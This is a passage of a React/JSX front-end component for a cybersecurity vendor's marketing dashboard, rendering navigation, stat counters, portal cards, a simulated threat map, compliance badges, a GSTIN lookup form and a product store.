            className="flex items-center gap-1.5 px-3 py-2 text-[10px] font-mono text-slate-500 hover:text-slate-200 hover:bg-slate-900/40 transition-all border-r border-slate-900 shrink-0 group"
          >
            <span className={`w-1.5 h-1.5 rounded-full ${item.dot} opacity-60 group-hover:opacity-100 transition-opacity`}></span>
            {item.label}
          </a>
        ))}
        <div className="flex-1"></div>
        <a
          href="https://intel.cyberdudebivash.com/upgrade.html"
          target="_blank"
          rel="noopener noreferrer"
          className="shrink-0 text-[9px] font-mono text-amber-400 bg-amber-950/30 border-l border-amber-900/30 px-3 py-2 hover:bg-amber-950/50 transition-all flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"></span>
          ENTERPRISE UPGRADE
        </a>
      </div>

      {/* 3. MOBILE MENU BAR */}
      <div className="lg:hidden bg-slate-950 border-b border-slate-900 p-2 flex justify-between overflow-x-auto gap-1">
        <button 
          onClick={() => setCurrentView("home")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "home" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Gateway
        </button>
        <button 
          onClick={() => setCurrentView("intel")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "intel" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Sentinel APEX
        </button>
        <button 
          onClick={() => setCurrentView("ai")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "ai" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          AI Audit
        </button>
        <button 
          onClick={() => setCurrentView("tools")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "tools" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          ThreatCore Tools
        </button>
        <button 
          onClick={() => setCurrentView("blog")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "blog" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          Blog
        </button>
        <button 
          onClick={() => setCurrentView("api")}
          className={`px-3 py-1 rounded text-xs shrink-0 font-bold ${currentView === "api" ? "bg-cyan-500 text-black" : "text-slate-400"}`}
        >
          API
        </button>
      </div>

      {/* 4. MAIN WORKSPACE VIEW ROUTER */}
      <div className="flex-1">

        {/* ================= VIEW 1: HOME / OFFICIAL GATEWAY (Image 4 copy) ================= */}
        {currentView === "home" && (
          <div className="p-4 md:p-8 space-y-8 max-w-7xl mx-auto w-full animate-fade-in">
            
            {/* Header Hero Section */}
            <div className="text-center space-y-4 max-w-3xl mx-auto">
              <div className="inline-flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-full py-1.5 px-4 text-xs font-mono text-cyan-400">
                <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-ping"></span>
                CYBERDUDEBIVASH® Global Cybersecurity Authority
              </div>
              
              <h2 className="text-3xl md:text-5xl font-extrabold tracking-tight text-white leading-tight">
                AI-Powered Cyber Defense &amp; <br />
                <span className="bg-gradient-to-r from-cyan-400 via-sky-400 to-emerald-400 bg-clip-text text-transparent">
                  Threat Intelligence Platform
                </span>
              </h2>

              <p className="text-sm md:text-base text-slate-400 leading-relaxed font-sans">
                CYBERDUDEBIVASH® delivers real-time threat intelligence, AI-powered SOC operations, 100+ production tools, and programmable REST APIs - unified in one enterprise command center used by security teams globally. Stop threat matrices before they impact your subnets.
              </p>

              <div className="flex flex-wrap items-center justify-center gap-4 pt-3">
                <button 
                  onClick={() => setCurrentView("intel")} 
                  className="px-6 py-3 bg-cyan-500 text-black hover:bg-cyan-400 font-extrabold rounded text-xs uppercase tracking-wider transition-all cursor-pointer flex items-center gap-2 shadow-lg shadow-cyan-500/20"
                >
                  <Activity className="w-4 h-4" /> View Live Threat Feed
                </button>
                <button 
                  onClick={() => setCurrentView("ai")} 
                  className="px-6 py-3 bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-slate-700 font-extrabold rounded text-xs uppercase tracking-wider transition-all cursor-pointer flex items-center gap-2"
                >
                  <Shield className="w-4 h-4 text-cyan-400" /> Start Free Security Audit
                </button>
              </div>
            </div>

            {/* Core Stats Counters */}
            <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-cyan-400 font-mono">500K+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Threat IOCs</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-emerald-400 font-mono">50+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Countries Protected</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-purple-400 font-mono">100+</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">AI Tools</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center">
                <div className="text-2xl md:text-3xl font-extrabold text-amber-500 font-mono">99.9%</div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">Uptime SLA</div>
              </div>
              <div className="bg-[#0c1117] border border-slate-800/80 p-4 rounded-lg text-center col-span-2 md:col-span-1">
                <div className="text-2xl md:text-3xl font-extrabold text-red-500 font-mono flex items-center justify-center gap-1.5">
                  <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse"></span>
                  24/7
                </div>
                <div className="text-[10px] md:text-xs text-slate-500 uppercase tracking-widest mt-1">SOC ACTIVE</div>
              </div>
            </div>

            {/* AI SOC Active Control Command Center */}
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">Autonomous AI SOC Orchestration &amp; Response Terminal</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Fully unified AI native network threat assessment, incident emulation, and real-time mitigation playbooks.</p>
                </div>
                <div className="text-[9px] font-mono text-slate-500 flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 animate-pulse"></span>
                  ORCHESTRATOR ONLINE (v4.9.1)
                </div>
              </div>
              <AiSocDashboard />
            </div>

            {/* Grid of 5 Live Connected Platforms */}
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">CYBERDUDEBIVASH® Unified Platforms &amp; Portals</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Direct secure gateways to active corporate sub-nets &amp; public cloud channels.</p>
                </div>
                <div className="text-[9px] font-mono text-slate-500 flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                  GLOBAL ACTIVE DIRECTORY SYNC
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                {ECOSYSTEM_PORTALS.map((portal) => {
                  const isPinging = pingingPortalId === portal.id;
                  return (
                    <div 
                      key={portal.id}
                      className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between space-y-4 hover:border-cyan-500/50 hover:bg-slate-900/40 transition-all group relative overflow-hidden"
                    >
                      <div className="absolute top-0 right-0 w-16 h-16 bg-cyan-500/5 rounded-full blur-xl group-hover:bg-cyan-500/20 transition-all"></div>
                      
                      <div className="space-y-1">
                        <div className="flex items-center justify-between gap-1">
                          <span className="text-[9px] font-mono text-slate-500 uppercase tracking-wider">{portal.tagline}</span>
                          <span className="text-[9px] font-mono text-emerald-400 bg-emerald-950/80 px-1 py-0.5 rounded border border-emerald-900/30 flex items-center gap-1 shrink-0">
                            <span className="w-1 h-1 rounded-full bg-emerald-400 animate-pulse"></span>
                            {portal.responseMs}ms
                          </span>
                        </div>
                        
                        <h4 className="text-xs font-extrabold text-white tracking-wide uppercase group-hover:text-cyan-400 transition-colors">{portal.name}</h4>
                        <p className="text-[10px] text-slate-400 leading-snug">{portal.description}</p>
                      </div>

                      <div className="space-y-2 pt-2">
                        <a 
                          href={portal.url} 
                          target="_blank" 
                          rel="noopener noreferrer" 
                          className="w-full bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-800 py-1.5 rounded text-[10px] font-extrabold uppercase tracking-widest flex items-center justify-center gap-1.5 transition-all text-center"
                        >
                          Visit Live <ExternalLink className="w-3 h-3 text-cyan-400" />
                        </a>
                        <button
                          onClick={() => triggerPortalPing(portal.id, portal.name, portal.url)}
                          className={`w-full py-1.5 rounded text-[10px] font-mono uppercase tracking-wider transition-all border cursor-pointer ${
                            isPinging 
                              ? "bg-cyan-950 text-cyan-400 border-cyan-800 animate-pulse" 
                              : "bg-slate-950 text-slate-500 border-slate-900 hover:text-slate-300 hover:bg-slate-900"
                          }`}
                        >
                          {isPinging ? "Handshaking..." : "Test Connection"}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Dynamic Handshake Logs Terminal */}
            {pingingPortalId && (
              <div className="bg-slate-950 border border-slate-800 rounded-lg overflow-hidden animate-fade-in">
                <div className="bg-[#0c1117] px-4 py-2 border-b border-slate-800 flex items-center justify-between">
                  <div className="flex items-center gap-2 text-[11px] font-mono font-bold text-cyan-400 uppercase tracking-wider">
                    <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                    <span>Active Telemetry Connection Handshaking Terminal</span>
                  </div>
                  <button 
                    onClick={() => setPingingPortalId(null)}
                    className="text-slate-500 hover:text-slate-300 font-mono text-[10px] uppercase tracking-wider cursor-pointer"
                  >
                    [Close Terminal]
                  </button>
                </div>
                <div className="p-4 font-mono text-[11px] text-slate-450 space-y-1 bg-black/90 select-text max-h-48 overflow-y-auto leading-relaxed">
                  {pingLogs.map((log, idx) => (
                    <div key={idx} className="flex gap-2">
                      <span className="text-cyan-600">[{idx + 1}]</span>
                      <span className={log.includes("[SUCCESS]") ? "text-emerald-400 font-bold" : log.includes("[ERR]") || log.includes("[WARNING]") ? "text-red-400" : "text-slate-300"}>
                        {log}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* ===== ECOSYSTEM DISCOVERY SECTION ===== */}
            <div className="bg-[#0a0d12] border border-slate-800/80 rounded-xl p-5 md:p-6">
              <EcosystemDiscovery onContact={() => setShowContactModal(true)} />
            </div>

            {/* Global Social Intelligence Command Center */}
            <div className="bg-[#0c1117]/60 border border-slate-800/80 rounded-lg p-5 space-y-4">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-slate-900 pb-3">
                <div className="space-y-0.5">
                  <h3 className="text-xs font-extrabold text-cyan-400 uppercase tracking-widest font-mono">Ecosystem Social Intelligence &amp; Gig Channels</h3>
                  <p className="text-[10px] text-slate-500 font-mono">Autonomous media outlets, freelancing agency registries, and verified developer coordinates.</p>
                </div>
                
                {/* Category filters */}
                <div className="flex flex-wrap gap-1 bg-slate-950 p-1 rounded border border-slate-900">
                  {["All", "Executive", "Social", "Freelance", "Media"].map((cat) => (
                    <button
                      key={cat}
                      onClick={() => setActiveSocialFilter(cat)}
                      className={`px-2.5 py-1 rounded text-[10px] font-mono tracking-wider transition-all cursor-pointer ${
                        activeSocialFilter === cat 
                          ? "bg-cyan-950 text-cyan-400 border border-cyan-800" 
                          : "text-slate-500 hover:text-slate-300 bg-transparent"
                      }`}
                    >
                      {cat}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
                {SOCIAL_PROFILES.filter(p => activeSocialFilter === "All" || p.category === activeSocialFilter).map((prof, idx) => (
                  <div 
                    key={idx} 
                    className="bg-slate-950 border border-slate-900 p-3.5 rounded flex flex-col justify-between space-y-3 hover:border-slate-800 hover:bg-slate-900/30 transition-all group"
                  >
                    <div className="space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-[9px] font-mono text-cyan-500 bg-cyan-950/50 px-1 py-0.5 rounded border border-cyan-900/30 font-bold uppercase tracking-wider shrink-0">{prof.platform}</span>
                        <span className="text-[8px] font-mono text-slate-650 block uppercase tracking-tight shrink-0">{prof.category}</span>
                      </div>
                      <h5 className="text-[11px] font-extrabold text-slate-200 truncate">{prof.username}</h5>
                      <span className="text-[9px] font-mono text-slate-500 block leading-snug">{prof.metric}</span>
                    </div>

                    <a 
                      href={prof.url} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="w-full bg-[#0c1117] hover:bg-cyan-500 hover:text-black border border-slate-800 hover:border-cyan-500 text-slate-400 text-[9px] font-mono py-1 rounded uppercase text-center transition-all flex items-center justify-center gap-1 cursor-pointer"
                    >
                      {prof.actionText} <ExternalLink className="w-2.5 h-2.5" />
                    </a>
                  </div>
                ))}
              </div>
            </div>

            {/* Live Sentinel Ticker Monitor (As shown in Image 4) */}
            <div className="bg-slate-950 border border-slate-800 rounded-lg overflow-hidden flex flex-col">
              <div className="bg-[#0c1117] border-b border-slate-800 px-4 py-2 flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-bold font-mono uppercase tracking-widest text-slate-300">
                  <Terminal className="w-4 h-4 text-cyan-500" />
                  <span>Sentinel APEX™ Active Event Logger</span>
                </div>
                <div className="text-[10px] font-mono text-slate-500 flex items-center gap-1.5">
                  <span className="inline-block w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                  GLOBAL CLOUD INGEST FEED
                </div>
              </div>
              <div className="p-4 font-mono text-xs text-slate-400 space-y-2 h-56 overflow-y-auto select-text">
                {liveLogs.map((log, index) => (
                  <div key={index} className="flex items-baseline gap-3 border-b border-slate-900/40 pb-1.5 last:border-b-0">
                    <span className="text-slate-600">{log.time}</span>
                    <span className={`px-1 rounded text-[9px] font-bold shrink-0 font-sans tracking-wide uppercase ${
                      log.severity === "CRITICAL" ? "bg-red-950/80 text-red-400 border border-red-800/30 animate-pulse" :
                      log.severity === "BLOCKED" ? "bg-emerald-950/80 text-emerald-400 border border-emerald-800/30" :
                      log.severity === "HIGH" ? "bg-orange-950/80 text-orange-400 border border-orange-800/30" :
                      "bg-yellow-950/80 text-yellow-400 border border-yellow-800/30"
                    }`}>
                      {log.severity}
                    </span>
                    <span className="text-slate-300 truncate">{log.msg}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Compliance badges and certifications bar */}
            <div className="bg-slate-900/50 border border-slate-800/80 rounded-lg p-6 space-y-4">
              <div className="text-center space-y-1">
                <h4 className="text-xs font-bold uppercase tracking-widest font-mono text-slate-400">Compliance &amp; Trust Core</h4>
                <p className="text-[11px] text-slate-500">Every audit, scan, and response is aligned with certified international and domestic security policies.</p>
              </div>
              <div className="flex flex-wrap items-center justify-center gap-3">
                {[
                  { title: "ISO 27001:2022 Certified", col: "text-cyan-400" },
                  { title: "SOC 2 Type II Audited", col: "text-emerald-400" },
                  { title: "GDPR Compliant", col: "text-purple-400" },
                  { title: "PCI-DSS v4.0 Hardened", col: "text-amber-500" },
                  { title: "India DPDP Act 2023", col: "text-slate-300 font-bold" },
                  { title: "MITRE ATT&CK Mapped", col: "text-red-400 font-bold" },
                  { title: "OWASP LLM Top 10", col: "text-sky-400" }
                ].map((item, idx) => (
                  <span key={idx} className="bg-slate-950 border border-slate-800 rounded px-2.5 py-1 text-[10px] font-mono flex items-center gap-1.5">
                    <Check className="w-3 h-3 text-emerald-500" />
                    <span className={item.col}>{item.title}</span>
                  </span>
                ))}
              </div>
            </div>

            {/* Corporate Transparency & India GSTIN Validator Node */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 bg-[#0c1117]/80 border border-slate-800 p-6 rounded-lg">
              <div className="lg:col-span-7 space-y-4">
                <div className="border-l-4 border-cyan-500 pl-3">
                  <h4 className="text-xs font-extrabold uppercase tracking-widest font-mono text-cyan-400">Corporate Entity Coordinates &amp; Legal Identity</h4>
                  <p className="text-[10px] text-slate-500 font-mono">Government of India official incorporation registry details for CyberDudeBivash Pvt Ltd.</p>
                </div>
                
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs font-mono">
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Legal Name (Founder)</span>
                    <span className="text-slate-200 font-bold block">{CORPORATE_REGISTRATION.legalName}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Trade / Brand Entity</span>
                    <span className="text-cyan-400 font-bold block">{CORPORATE_REGISTRATION.tradeName}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Permanent Account Number (PAN)</span>
                    <span className="text-amber-500 font-bold block">{CORPORATE_REGISTRATION.pan}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Government GSTIN ID</span>
                    <span className="text-emerald-400 font-bold block">{CORPORATE_REGISTRATION.gstin}</span>
                  </div>
                  <div className="bg-slate-950 p-3 rounded border border-slate-900/60 space-y-1 sm:col-span-2">
                    <span className="text-[9px] text-slate-500 uppercase tracking-wider block">Registered HQ Physical Address</span>
                    <span className="text-slate-300 block font-sans leading-normal text-[11px]">{CORPORATE_REGISTRATION.address}</span>
                  </div>
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-950 border border-slate-900 rounded-lg p-5 flex flex-col justify-between space-y-4">
                <div className="space-y-2">
                  <h5 className="text-[11px] font-bold font-mono text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse"></span>
                    India GSTIN Verification Gateway
                  </h5>
                  <p className="text-[10px] text-slate-500 font-sans leading-snug">
                    Query the Central Board of Indirect Taxes and Customs (CBIC) common registry to confirm active licensing status.
                  </p>
                </div>

                <form onSubmit={verifyGstInward} className="space-y-3">
                  <div className="space-y-1.5">
                    <label className="text-[9px] font-mono text-slate-500 uppercase tracking-widest block">Inward GSTIN Token</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        value={gstInput}
                        onChange={(e) => setGstInput(e.target.value)}
                        placeholder="E.g. 21ARKPN8270G1ZP"
                        className="flex-1 bg-black border border-slate-800 rounded px-3 py-2 text-xs font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
                      />
                      <button 
                        type="submit" 
                        disabled={gstVerifying}
                        className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-2 rounded text-xs font-extrabold uppercase tracking-wider transition-all disabled:opacity-50 cursor-pointer shrink-0"
                      >
                        {gstVerifying ? "Querying..." : "Verify"}
                      </button>
                    </div>
                  </div>
                </form>

                {gstVerificationResult && (
                  <div className={`p-4 rounded border font-mono text-[11px] leading-relaxed animate-fade-in ${
                    gstVerificationResult.status === "SUCCESS_ACTIVE" 
                      ? "bg-emerald-950/40 border-emerald-900 text-slate-300" 
                      : "bg-red-950/40 border-red-900 text-slate-300"
                  }`}>
                    {gstVerificationResult.status === "SUCCESS_ACTIVE" ? (
                      <div className="space-y-2">
                        <div className="flex items-center gap-2 text-emerald-400 font-bold border-b border-emerald-900/60 pb-1.5">
                          <CheckCircle2 className="w-4 h-4" />
                          <span>REGISTRY RECORD ACTIVE</span>
                        </div>
                        <div className="space-y-1 text-[10px]">
                          <div><span className="text-slate-500">Legal Name:</span> <span className="text-slate-200 font-bold">{gstVerificationResult.legalName}</span></div>
                          <div><span className="text-slate-500">Trade Entity:</span> <span className="text-cyan-400 font-bold">{gstVerificationResult.tradeName}</span></div>
                          <div><span className="text-slate-500">Taxpayer Class:</span> <span className="text-slate-300">{gstVerificationResult.taxpayerType}</span></div>
                          <div><span className="text-slate-500">State Code:</span> <span className="text-slate-300">21 (Odisha, IN)</span></div>
                          <div><span className="text-slate-500">Compliance score:</span> <span className="text-emerald-400 font-bold">{gstVerificationResult.complianceScore}</span></div>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-1.5">
                        <div className="text-red-400 font-bold border-b border-red-900/60 pb-1">Error Unresolved</div>
                        <p className="text-[10px] text-slate-400 font-sans">{gstVerificationResult.message}</p>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

            {/* Gumroad Products Marketplace */}
            <div className="space-y-4">
              <div className="border-l-4 border-cyan-500 pl-3">
                <h3 className="text-xs font-extrabold uppercase tracking-widest font-mono text-slate-400">Cyber Defense Store (Gumroad Kits)</h3>
                <p className="text-[11px] text-slate-500">Directly download production-ready compliance assets, SIGMA rules, and response playbooks.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                {premiumProducts.map((p) => {
                  const isPurchased = purchasedProduct === p.id;
                  return (
                    <div key={p.id} className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between space-y-3 hover:border-slate-700 transition-all">
                      <div className="space-y-1">
                        <div className="flex justify-between items-start gap-1">
                          <span className="text-[11px] font-bold text-slate-200 line-clamp-2">{p.title}</span>
                          <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950 px-1 py-0.5 rounded border border-emerald-900">{p.price}</span>
                        </div>
                        <p className="text-[10px] text-slate-500 leading-snug">{p.desc}</p>
                      </div>
                      <button
                        onClick={() => handleCheckoutProduct(p)}
                        className={`w-full py-1.5 rounded text-[10px] font-bold uppercase tracking-wider transition-all ${
                          isPurchased 
                            ? "bg-emerald-950 text-emerald-400 border border-emerald-800 flex items-center justify-center gap-1"
                            : "bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 cursor-pointer"
                        }`}
                        id={`gumroad-${p.id}`}
                      >
                        {isPurchased ? (
                          <>
                            <CheckCircle2 className="w-3.5 h-3.5" /> Ordered
                          </>
                        ) : "Checkout"}
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Trusted Sectors */}
            <div className="bg-[#0c1117] border border-slate-800 p-6 rounded-lg grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">2,800+</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">SOC Teams Served</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">99.7%</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">AI Detection Rate</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">&lt;15m</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">Managed SOC SLA</p>
              </div>
              <div>
                <span className="text-xl md:text-2xl font-bold font-mono text-slate-300">95%</span>
                <p className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">ROSI Return Rate</p>
              </div>
            </div>

          </div>
        )}

        {/* ================= VIEW 2: SENTINEL APEX THREAT INTEL ================= */}
        {currentView === "intel" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            {/* Real-Time Attack Map Simulation Row */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Live Attack Nodes (SVG/Visual Layout simulation) */}
              <div className="lg:col-span-8 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between min-h-[380px]">
                <div className="flex items-center justify-between border-b border-slate-900 pb-3 mb-3">
                  <div className="space-y-1">
                    <h3 className="text-xs font-bold font-mono uppercase tracking-widest text-slate-300 flex items-center gap-1.5">
                      <Globe className="w-4 h-4 text-cyan-500" />
                      Live Threat Map Indicator
                    </h3>
                    <p className="text-[10px] text-slate-500 leading-none">Interactive nodes &bull; Real-time global intercept paths</p>
                  </div>
                  <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/50">
                    SCAN SPEED: {scanSpeedHz} K/sec
                  </span>
                </div>

                {/* Animated Cyber Map Nodes */}
                <div className="flex-1 bg-slate-950/70 border border-slate-900 rounded p-4 relative overflow-hidden flex flex-col justify-center items-center">
                  
                  {/* Mock Map Grid lines */}
                  <div className="absolute inset-0 grid grid-cols-8 grid-rows-6 opacity-[0.03] pointer-events-none">
                    {Array.from({ length: 48 }).map((_, i) => (
                      <div key={i} className="border border-cyan-500"></div>
                    ))}
                  </div>

                  {/* Pulsing Cyber Targets */}
                  <div className="absolute top-[20%] left-[20%] text-center">
                    <span className="absolute inline-flex h-4 w-4 rounded-full bg-cyan-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-cyan-500"></span>
                    <span className="block text-[8px] font-mono text-cyan-400 mt-1 uppercase">US-EAST-01</span>
                  </div>

                  <div className="absolute bottom-[25%] left-[45%] text-center">
                    <span className="absolute inline-flex h-5 w-5 rounded-full bg-emerald-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
                    <span className="block text-[8px] font-mono text-emerald-400 mt-1 uppercase">HQ_Odisha_IN</span>
                  </div>

                  <div className="absolute top-[40%] right-[25%] text-center">
                    <span className="absolute inline-flex h-6 w-6 rounded-full bg-red-500/20 animate-ping"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                    <span className="block text-[8px] font-mono text-red-400 mt-1 uppercase">AP-NORTH-04</span>
                  </div>

                  {/* Attack Path line overlays */}
                  <svg className="absolute inset-0 w-full h-full pointer-events-none opacity-40">
                    <line x1="20%" y1="20%" x2="45%" y2="75%" stroke="#06b6d4" strokeWidth="1.5" strokeDasharray="5,5" className="animate-[pulse_2s_infinite]" />
                    <line x1="75%" y1="40%" x2="45%" y2="75%" stroke="#ef4444" strokeWidth="1.5" strokeDasharray="5,3" />
                  </svg>

                  <div className="text-center max-w-sm space-y-2 z-10">
                    <Shield className="w-10 h-10 text-cyan-500 mx-auto animate-pulse" />
                    <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest block">Active Scan Core</span>
                    <p className="text-xs font-semibold text-slate-300">Sentinel APEX Threat Mapping Operational</p>
                    <p className="text-[11px] text-slate-500 leading-normal">Our global sensor network continuously captures, validates, and correlates cyber event streams back to Ragadi, Odisha command center.</p>
                  </div>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-3 pt-3 border-t border-slate-900 text-center font-mono">
                  <div>
                    <span className="text-xs text-slate-500">Origin: USA</span>
                    <span className="block text-xs font-bold text-slate-300 mt-0.5">38 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Origin: Russia</span>
                    <span className="block text-xs font-bold text-[#ef4444] mt-0.5">43 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Origin: China</span>
                    <span className="block text-xs font-bold text-orange-400 mt-0.5">26 Attacks</span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500">Defense Index</span>
                    <span className="block text-xs font-bold text-emerald-400 mt-0.5">99.98% OK</span>
                  </div>
                </div>

              </div>

              {/* Perimeter Status Metrics */}
              <div className="lg:col-span-4 flex flex-col gap-4">
                
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex flex-col justify-between shrink-0">
                  <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest mb-3">Defensive Perimeter Metrics</h3>
                  <div className="space-y-4">
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>WAF / Sentinel Load</span>
                        <span className="text-cyan-400">{firewallLoad}%</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div 
                          className="bg-cyan-500 h-full rounded-full transition-all duration-1000"
                          style={{ width: `${firewallLoad}%` }}
                        ></div>
                      </div>
                    </div>
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>AI Model Synchronization</span>
                        <span className="text-emerald-400">100% SECURE</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div className="bg-emerald-500 h-full rounded-full w-full"></div>
                      </div>
                    </div>
                    <div>
                      <div className="flex justify-between text-[10px] mb-1 font-mono">
                        <span>Sentinel Threat Vault</span>
                        <span className="text-amber-500">OPTIMAL</span>
                      </div>
                      <div className="w-full bg-slate-950 h-1.5 rounded-full overflow-hidden border border-slate-900">
                        <div className="bg-amber-500 h-full rounded-full w-[90%]"></div>
                      </div>
                    </div>
                  </div>

                  <div className="mt-6 border-t border-slate-800 pt-4">
                    <h4 className="text-[10px] font-bold text-slate-400 uppercase font-mono mb-2">Global Threat Distribution</h4>
                    <div className="grid grid-cols-2 gap-2 text-[9px] font-mono text-center">
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-slate-400">US-EAST: OK</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-slate-400 font-bold">EU-WEST: OK</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 rounded text-emerald-400 font-bold">IN-SOUTH: LIVE</div>
                      <div className="p-1.5 bg-slate-950 border border-slate-900 text-red-400 rounded animate-pulse">AP-NORTH: BUSY</div>
                    </div>
                  </div>
                </div>

                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg flex-1 flex flex-col justify-between">
                  <div className="space-y-2">
                    <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest flex items-center justify-between">
                      <span>Threat Risk Index</span>
